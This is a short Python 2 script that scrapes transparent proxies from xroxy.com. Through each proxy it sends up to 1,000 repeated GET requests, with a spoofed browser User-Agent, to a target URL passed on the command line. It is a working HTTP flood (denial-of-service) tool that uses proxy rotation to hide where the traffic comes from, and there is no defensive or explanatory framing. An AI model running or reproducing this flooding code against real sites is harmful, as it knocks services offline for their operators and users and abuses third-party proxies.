#!/usr/bin/env python
# -*- coding: utf-8 -*-


import requests as request
import sys
from bs4 import BeautifulSoup

class Requester:

	def __init__(self, flood_max, http_url, proxy_ip, proxy_port):

		flood_max = int(flood_max)
		count = 0
		headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)", "Referer": "http://example.com"}
		
		if proxy_ip is not None and proxy_port is not None: proxy = {"http": proxy_ip + ':' + proxy_port}
		else: proxy = None
		
		while count < flood_max:
			
			try:
				
				if proxy is not None: r = request.get(http_url, headers=headers, proxies=proxy)
				else: r = request.get(http_url, headers=headers)
				
				print '%s - %s - %s' % (count, r.status_code, r.url)
				count += 1

				if r.status_code != 200:
					break
			
			except Exception:
				break	
			



#works only for xroxy.com
#url I use http://www.xroxy.com/proxylist.php?port=Standard&type=All_http&ssl=&country=&latency=1000&reliability=9000#table
#but feel free to use other parameters

class ProxyScraper:

	def __init__(self, proxylist_url, url):
		headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)", "Referer": "http://example.com"}
		r = request.get(proxylist_url, headers=headers)
		self.parse_document(r.content, url)

	def parse_document(self, html, url):
		
		soup = BeautifulSoup(html)
		soup.prettify()
		
		for proxy in soup.findAll('prx:proxy'):
			
			if proxy.find('prx:type').string == 'Transparent' and int(proxy.find('prx:latency').string) <= 1000 and int(proxy.find('prx:reliability').string >= 9000):

				ip = proxy.find('prx:ip').string
				port = proxy.find('prx:port').string

				print '\nSwitching to proxy server: %s:%s\n' % (ip, port)

				requestflood = Requester(1000, url, ip, port)


a = ProxyScraper(sys.argv[1], sys.argv[2])




